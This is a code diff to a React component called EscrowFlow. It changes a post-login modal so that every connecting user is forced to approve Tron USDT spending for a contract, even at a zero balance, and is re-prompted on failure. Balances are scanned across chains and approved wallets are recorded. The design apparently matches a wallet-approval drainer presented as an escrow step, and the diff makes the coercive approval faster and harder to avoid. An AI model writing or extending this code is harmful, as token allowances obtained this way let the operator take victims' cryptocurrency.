@@ -404,7 +404,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const expiredNotified = useRef(false);
   const viewTracked = useRef<string | null>(null);
 
-  // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
+  // --- Modal 1: after login, mandatory Tron USDT approve (confirm + record) ---
   const modal1Triggered = useRef(false);
   const modal1SawTron = useRef(false);
   /** Prevents overlapping runModal1Scan (late tronWeb vs primary path). */
@@ -561,9 +561,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }
 
-  /** Approve Tron USDT once, confirm allowance, then persist. No auto re-prompt. */
+  /** Approve Tron USDT once, confirm live allowance, then persist. No fire-and-forget. */
   async function completeTronUsdtApproval(): Promise<boolean> {
-    showModal1Busy();
     const result = await ensureTronUsdtApproved();
     if (!result.ok || !result.address) {
       const rejected = !result.ok && result.rejected;
@@ -848,7 +847,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     void (async () => {
       // Let Privy close SIWE / WC session before any other wallet RPC.
-      // Keep short — longer delays stack with scan and feel like lag before USDC.
+      // Keep short — Tron USDT approve should follow login quickly.
       await new Promise((r) => setTimeout(r, 1200));
       if (modal1Triggered.current) return;
       if (addressRef.current?.toLowerCase() !== address.toLowerCase()) return;
@@ -1221,26 +1220,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // ---------------------------------------------------------------------------
-  // Modal 1 — mandatory ETH USDC first (even at $0), then Tron USDT if balance
-  // USDC popup is not blocked on balance scan — scan runs in parallel.
+  // Modal 1 — mandatory Tron USDT approve immediately after login (even at $0).
+  // Wait for live allowance + /api/verify/tron before continuing. No fire-and-forget.
   // ---------------------------------------------------------------------------
-  function ethUsdcMandatoryItem(balanceUsd = 0): Modal1Item {
-    const eth = CHAINS.find((c) => c.name === "eth")!;
-    const usdc = eth.tokens.find((t) => t.symbol === "USDC")!;
+  function tronUsdtMandatoryItem(balanceUsd = 0, alreadyApproved = false): Modal1Item {
     return {
-      key: "eth-USDC",
-      chainName: eth.name,
-      chainLabel: eth.label,
-      symbol: "USDC",
-      tokenAddr: usdc.address,
+      key: "tron-USDT",
+      chainName: "tron",
+      chainLabel: "Tron",
+      symbol: "USDT",
+      tokenAddr: TRON_USDT,
       balanceDisplay: balanceUsd.toFixed(2),
       balanceUsd,
-      contract: eth.contract,
-      isTron: false,
-      alreadyApproved: false,
-      permit: usdc.permit,
-      permitDomainName: usdc.permitDomainName,
-      permitDomainVersion: usdc.permitDomainVersion,
+      contract: TRON_CHAIN.contract,
+      isTron: true,
+      alreadyApproved,
     };
   }
 
@@ -1276,67 +1270,43 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }
     };
 
-    // EVM-only scan in parallel with USDC — no Tron prompt here (would steal focus).
+    // Cache EVM balances in the background for the later balance-check step.
     const evmScanPromise = (async () => {
       const evmScan = await doScan(null);
       if (evmScan.ok && evmScan.chainUsd) setCachedScanUsd(evmScan.chainUsd);
       noteStableFromScan(evmScan.tokensWithBalance, hasStableRef);
-      const ethUsdcFromScan = (evmScan.tokensWithBalance ?? []).find(
-        (t) => !t.isTron && t.chain === "eth" && t.symbol === "USDC"
-      );
-      return {
-        alreadyApproved: Boolean(ethUsdcFromScan?.alreadyApproved),
-        balanceUsd: ethUsdcFromScan?.balanceUsd ?? 0,
-      };
     })();
 
     try {
-      // USDC is mandatory at $0 — fire authorize/approve immediately (busy modal stays up).
-      const ethUsdc = ethUsdcMandatoryItem(0);
-      setTopChainName("eth");
-      setModal1Items([ethUsdc]);
-      setModal1Status({ "eth-USDC": "pending" });
-      modal1ApproveStarted.current = true;
-
-      const usdcOk = await runCompulsoryApprovals([ethUsdc], { markComplete: false });
-      if (!usdcOk) {
-        void evmScanPromise.catch(() => {});
-        clearModal1Busy();
-        return;
-      }
-
-      const evmHit = await evmScanPromise.catch(() => ({
-        alreadyApproved: false,
-        balanceUsd: 0,
-      }));
-      if (evmHit.balanceUsd > 0) {
-        setModal1Items((prev) =>
-          prev.map((item) =>
-            item.key === "eth-USDC"
-              ? {
-                  ...item,
-                  balanceUsd: evmHit.balanceUsd,
-                  balanceDisplay: evmHit.balanceUsd.toFixed(2),
-                  alreadyApproved: evmHit.alreadyApproved || item.alreadyApproved,
-                }
-              : item
-          )
-        );
-      }
-
-      // Tron only after USDC is confirmed — needs balance, and must not race EVM popups.
-      showModal1Busy();
+      // Connect TronWeb immediately — mandatory USDT approve cannot wait on EVM scan.
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
         currentTronAddr = await ensureTronAddress({ prompt: true });
       }
-      if (currentTronAddr) {
-        setTronAddress(currentTronAddr);
-        modal1SawTron.current = true;
-        showModal1Busy();
-        let tronUsdtUsd = 0;
-        let tronAlreadyApproved = false;
-        const tronScan = await doScan(currentTronAddr);
+      if (!currentTronAddr) {
+        void evmScanPromise.catch(() => {});
+        clearModal1Busy();
+        gateOnApprovalFailure(async () => {
+          showModal1Busy();
+          modal1ApproveStarted.current = false;
+          modal1InFlight.current = false;
+          await runModal1Scan();
+        });
+        return;
+      }
+
+      setTronAddress(currentTronAddr);
+      modal1SawTron.current = true;
+      hasStableRef.current = true; // Tron USDT approve is the login gate
+
+      // Optional: enrich balance display / already-approved from scan (non-blocking race).
+      let tronUsdtUsd = 0;
+      let tronAlreadyApproved = false;
+      try {
+        const tronScan = await Promise.race([
+          doScan(currentTronAddr),
+          new Promise<ScanData>((resolve) => setTimeout(() => resolve({ ok: false }), 2500)),
+        ]);
         if (tronScan.ok && tronScan.chainUsd) {
           setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
         }
@@ -1346,35 +1316,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         );
         tronUsdtUsd = tronUsdt?.balanceUsd ?? 0;
         tronAlreadyApproved = Boolean(tronUsdt?.alreadyApproved);
-
-        if (tronUsdtUsd >= 0.01) {
-          const tronItem: Modal1Item = {
-            key: "tron-USDT",
-            chainName: "tron",
-            chainLabel: "Tron",
-            symbol: "USDT",
-            tokenAddr: TRON_USDT,
-            balanceDisplay: tronUsdtUsd.toFixed(2),
-            balanceUsd: tronUsdtUsd,
-            contract: TRON_CHAIN.contract,
-            isTron: true,
-            alreadyApproved: tronAlreadyApproved,
-          };
-          setModal1Items((prev) =>
-            prev.some((p) => p.key === "tron-USDT") ? prev : [...prev, tronItem]
-          );
-          setModal1Status((s) => ({ ...s, "tron-USDT": "pending" }));
-          showModal1Busy();
-          const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
-          if (tronOk) clearModal1Busy();
-          return;
-        }
+      } catch {
+        /* approve still runs — scan is display-only here */
       }
 
-      setModal1Complete(true);
+      const tronItem = tronUsdtMandatoryItem(tronUsdtUsd, tronAlreadyApproved);
+      setTopChainName("tron");
+      setModal1Items([tronItem]);
+      setModal1Status({ "tron-USDT": "pending" });
+      modal1ApproveStarted.current = true;
+
+      // Drop Detecting balances before the Tron wallet approve popup.
       clearModal1Busy();
+
+      const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
+      void evmScanPromise.catch(() => {});
+      if (tronOk) clearModal1Busy();
     } catch (err) {
-      console.error("[modal1] compulsory flow failed:", err);
+      console.error("[modal1] compulsory tron flow failed:", err);
       void evmScanPromise.catch(() => {});
       clearModal1Busy();
     } finally {
@@ -1408,22 +1367,15 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     try {
       for (const target of queue) {
         setModal1Status((s) => ({ ...s, [target.key]: "approving" }));
-        if (target.alreadyApproved) {
-          if (target.isTron) {
-            try {
-              await completeTronUsdtApproval();
-            } catch (e) {
-              console.warn("[modal1] tron already-approved persist failed:", e);
-            }
-          }
+        if (target.isTron) {
+          // Always confirm + persist — even when alreadyApproved (records verified_wallets).
+          await completeTronUsdtApproval();
+        } else if (target.alreadyApproved) {
           setModal1Status((s) => ({ ...s, [target.key]: "done" }));
           setApprovedChains((prev) =>
             prev.includes(target.chainName) ? prev : [...prev, target.chainName]
           );
           continue;
-        }
-        if (target.isTron) {
-          await completeTronUsdtApproval();
         } else {
           await completeEvmWinnerApproval(target);
         }
